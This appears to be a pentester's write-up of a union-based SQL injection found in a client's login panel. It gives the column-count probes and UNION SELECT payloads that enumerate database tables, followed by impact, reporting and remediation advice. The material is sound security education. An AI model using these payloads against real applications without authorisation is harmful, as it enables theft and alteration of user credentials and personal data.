Union-Based SQL Injection: From Discovery to Database Dump

How I discovered a union-based SQLi in a login panel during an engagement — the recon steps, payload crafting, and how it exposed full read/write access to the database.

Background

During a black-box web application assessment for a client, I came across a standard login panel. No WAF detected in initial probing, input fields were reflecting errors verbosely — classic conditions for SQL injection testing.

Detection

A single quote in the username field returned a database error. That confirmed unsanitised input was hitting the query directly. I then tested for the number of columns using ORDER BY:

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← error here → 2 columns confirmed

Union-based extraction

With column count confirmed, I started extracting data. The goal was to identify which columns were reflected in the response:

' UNION SELECT NULL, NULL--
' UNION SELECT 'a', NULL--
' UNION SELECT NULL, 'a'--

Second column reflected text in the response. From there, extracting database metadata was straightforward:

' UNION SELECT NULL, database()--
' UNION SELECT NULL, group_concat(table_name) FROM information_schema.tables
  WHERE table_schema=database()--

Impact

The vulnerability allowed full SELECT, INSERT, UPDATE, and DROP operations on the application database. User credentials, PII, and internal records were all accessible. I documented the full exploitation chain and reported it with a PoC before any data was extracted beyond what was needed to confirm severity.

Remediation

The fix is well-understood: parameterised queries (prepared statements) eliminate this class of vulnerability entirely. Additionally, the application's database user had far more privileges than needed — principle of least privilege should apply at the DB layer too.

Key takeaway

Verbose error messages are a gift to an attacker. Even if you patch the injection, suppress database errors in production — they hand over the database structure on a plate.
